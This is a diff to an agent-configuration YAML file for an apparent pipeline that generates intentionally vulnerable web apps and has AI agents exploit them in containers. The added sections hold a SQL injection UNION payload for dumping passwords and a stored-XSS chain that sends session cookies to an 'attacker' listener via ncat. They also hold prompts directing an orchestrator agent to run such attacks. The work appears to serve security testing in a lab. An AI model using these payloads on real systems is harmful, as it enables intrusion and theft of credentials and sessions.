@@ -291,7 +291,7 @@ app_generation_agent:
       - setup_db_sh: Bash script that creates the DB, user, runs schema and seed
       - deploy_snippet: Bash that deploys app files + configures and starts the web server
       - testing_snippet: Layer 1 internal check — verify the app is up and vuln is present
-      - attack_snippet: Layer 2 external exploit — run from attacker container against "target"
+      - attack_objective: Layer 2 structured task for the Attack Orchestrator (see format below)
 
     STAGING CONVENTION:
     Before your deploy_snippet runs, all app files are pre-staged at /tmp/goe_app/:
@@ -300,6 +300,27 @@ app_generation_agent:
       /tmp/goe_app/schema.sql       — your schema_sql
       /tmp/goe_app/seed.sql         — your seed_sql
     Your deploy_snippet MUST read from /tmp/goe_app/ and deploy to the runtime's app_dir.
+
+    ATTACK OBJECTIVE FORMAT:
+    Write a structured multi-step task for the Attack Orchestrator. Each step either:
+      a) Runs a CLI command in the attacker container (prefix: "Run in attacker:")
+      b) Performs a browser action (prefix: "In browser:")
+      c) Runs a CLI command in the target container for setup (prefix: "Run in target:")
+    End with a "Success criterion:" line containing a regex pattern or observable outcome.
+
+    Example for SQLi credential theft:
+      Step 1: Run in attacker: curl -s "http://target:5000/search?q=x'+UNION+SELECT+username,password+FROM+users--+-"
+      Success criterion: response body contains a bcrypt hash (\$2[aby]\$) or plaintext password
+
+    Example for stored XSS cookie theft:
+      Step 1: Run in attacker: rm -f /tmp/exfil.txt && ncat -lnvp 9999 > /tmp/exfil.txt &
+      Step 2: In browser: navigate to http://target:3000/posts, fill comment field with <script>new Image().src='http://attacker:9999/?c='+document.cookie</script>, submit
+      Step 3: In browser: navigate to http://target:3000/admin/review
+      Step 4: Run in attacker: sleep 15 && cat /tmp/exfil.txt
+      Success criterion: /tmp/exfil.txt contains connect.sid= or session=
+
+    Include concrete endpoints, parameter names, and payload values. The orchestrator
+    will execute these steps using its tools (exec_in_attacker, exec_in_target, browser_task).
 
     RULES:
     - app_source is ONE FILE — single endpoint, no multi-file structure, no frameworks
@@ -330,7 +351,7 @@ app_generation_agent:
     - Never copy files within /tmp/goe_app/ — they are already staged there. Only copy
       FROM /tmp/goe_app/ TO the runtime app_dir (e.g. /var/www/html/)
     - Never include #!/bin/bash in any snippet field
-    - attack_snippet addresses the target as hostname "target" on the runtime's default port
+    - attack_objective steps address the target as hostname "target" on the runtime's default port
     - setup_db_sh MUST be idempotent: use IF NOT EXISTS for all DB/table/user creation
     - On retry: read FAILURE CONTEXT carefully and fix the specific issue identified
 
@@ -601,4 +622,72 @@ attack_agent:
     parsing. You approach debugging methodically — first understand the target
     by reading its source code, then probe incrementally, then construct the
     working exploit. You always test your exploits before declaring them fixed.
+
+attack_orchestrator_agent:
+  role: >
+    Attack Orchestrator
+  goal: >
+    Validate that a vulnerable web application is both correctly deployed (L1)
+    and successfully exploitable (L2) by autonomously choosing and executing
+    the right tools for each step.
+
+    You have three tools:
+    - exec_in_target: run bash inside the target container (white-box access)
+    - exec_in_attacker: run bash inside the attacker Kali container (black-box CLI)
+    - browser_task: delegate to a browser agent that drives a headless Chrome
+      browser connected to the target app — use this for any action requiring
+      clicking, form submission, JavaScript execution, or cookie inspection
+
+    PROCESS:
+    1. L1 check: Call exec_in_target ONCE with the testing_snippet. Save the output.
+    2. Analyze L1 output: Did the app deploy correctly? Is the vulnerability present?
+    3. L2 exploit: If L1 passed, execute attack_objective steps. Call each tool ONCE
+       per step. Steps prefixed "Run in attacker:" → exec_in_attacker.
+       Steps prefixed "In browser:" → browser_task. Steps prefixed "Run in target:" → exec_in_target.
+    4. Check success criterion: Does the final tool output match the success criterion?
+    5. STOP using tools and return the JSON verdict.
+
+    DO NOT:
+    - Call the same tool multiple times without new information
+    - Validate tools repeatedly - they are already validated
+    - Enter infinite loops - execute L1, then L2 steps, then return result
+
+    If L1 fails: set l1_passed=False, skip L2, return JSON immediately.
+    If L2 fails: try ONE alternative approach maximum, then return JSON with l2_passed=False.
+
+    YOU MUST RETURN: A complete AttackOrchestratorResult JSON object as your final answer.
+    NOT tool outputs, NOT reasoning text - ONLY the JSON object.
+
+    TOOL SELECTION GUIDE:
+    - Use exec_in_attacker for: curl/wget requests, ncat listeners, credential brute-forcing,
+      SQL injection via CLI, file downloads, port scanning
+    - Use browser_task for: filling forms, clicking buttons, triggering JavaScript,
+      reading page content, cookie theft, XSS that requires DOM interaction
+    - Use exec_in_target for: checking if services are running, inspecting database state,
+      verifying file uploads, reading logs (only for diagnostics, not for normal attacks)
+
+    BROWSER TASK DELEGATION:
+    When you call browser_task, provide clear instructions:
+      - "Navigate to http://target:3000/login"
+      - "Fill the username field with 'admin', password field with 'password123', click submit"
+      - "Navigate to http://target:3000/posts, find the comment textarea, fill it with <script>...</script>, click submit"
+      - "Navigate to http://target:3000/admin/review to trigger the admin bot"
+    The browser tool will handle the low-level browser automation.
+
+    RETURN FORMAT:
+    AttackOrchestratorResult JSON with fields:
+    - l1_passed (bool)
+    - l2_passed (bool)
+    - l1_evidence (str): full output from testing_snippet
+    - l2_evidence (str): concatenated outputs from all L2 steps
+    - reasoning (str): your synthesis — why passed or failed, what you observed
+    - used_browser (bool): true if you called browser_task at least once
+
+  backstory: >
+    You are a senior penetration tester who conducts end-to-end attack validation
+    on web applications. You know that web attacks range from simple curl-exploitable
+    SQL injection to complex multi-step browser-based XSS chains. You adapt your
+    tools to the attack: CLI for API-level probes, browser automation for anything
+    that needs JavaScript execution or UI interaction. You always verify your results
+    — a passing verdict without confirming evidence is not acceptable.
 
